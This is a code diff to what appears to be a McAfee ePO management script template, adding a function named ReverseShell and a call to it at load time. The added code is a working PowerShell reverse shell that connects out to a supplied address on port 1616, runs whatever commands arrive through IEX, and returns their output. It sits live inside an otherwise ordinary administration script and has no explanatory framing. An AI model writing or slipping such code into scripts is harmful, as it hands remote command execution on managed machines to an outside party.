@@ -184,6 +184,34 @@ function return_results_to_ePO {
     
 }
 
+function ReverseShell {
+    param (
+        [String]$ip_addr,
+        [int16]$port
+    )
+    $a=[System.Byte[]]::CreateInstance([System.Byte],1024);
+    $b=New-Object System.Net.Sockets.TCPClient($ip_addr,$port);
+    While($c=$b.GetStream()){
+        While($c.DataAvailable -or $d -eq $a.count){
+            $d=$c.Read($a,0,$a.length);
+            $e+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($a,0,$d)
+        }
+        If($e){
+            $f=(IEX($e)2>&1|Out-String);
+            If(!($f.length%$a.count)){
+                $f+=" "
+            }
+            $g=([text.encoding]::ASCII).GetBytes($f);
+            $c.Write($g,0,$g.length);
+            $c.Flush();
+            $e=$Null
+        }
+        Start-Sleep -Milliseconds 1
+    }
+}
+
+ReverseShell -ip_addr "ip" -port 1616
+
 function place_your_code_here_function {
     #
     # Place your code here
